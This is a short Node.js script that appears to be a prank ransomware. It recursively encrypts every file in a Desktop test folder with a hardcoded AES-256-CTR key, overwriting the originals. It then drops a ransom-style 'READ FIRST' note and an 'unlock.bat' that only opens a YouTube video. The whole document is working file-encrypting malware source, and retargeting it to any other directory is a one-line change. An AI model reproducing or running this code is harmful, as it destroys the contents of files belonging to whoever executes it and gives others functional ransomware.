const fs = require('fs');
const { resolve } = require('path');
const homedir = require('os').homedir();
const crypto = require('crypto');
const { start } = require('repl');
const { readdir } = require('fs').promises;
const KEY = Buffer.from("bf3c199c2470cb477d907b1e0917c17bbf3c199c2470cb477d907b1e0917c17b", "hex");
const IV = Buffer.from("5183666c72eec9e45183666c72eec9e4", "hex");

async function* getFiles(dir) {
    const dirEntries = await readdir(dir, { withFileTypes: true });
    for (const dirEntry of dirEntries) {
      const res = resolve(dir, dirEntry.name);
      if (dirEntry.isDirectory()) {
        yield* getFiles(res);
      } else {
        yield res;
      }
    }
    }
const encrypt = ((val) => {
    let cipher = crypto.createCipheriv('aes-256-ctr', KEY, IV);
    let encrypted = cipher.update(val, 'utf8', 'base64');
    encrypted += cipher.final('base64');
      return encrypted
    });

 ;(async () => {
    for await (const f of getFiles(`${homedir}\\Desktop\\test_folder`)) {
            const data = fs.readFileSync(f, 'utf8')
            fs.writeFileSync(f, encrypt(data))
            fs.writeFileSync(`${homedir}/Desktop/READ FIRST.txt`, 'to unlock your files, simply run the unlock.bat file :)PS: always check where you download files from. and never run a file someone sent you')
            fs.writeFileSync(`${homedir}/Desktop/unlock.bat`, 'start "" https://www.youtube.com/watch?v=p7YXXieghto')
          }})()
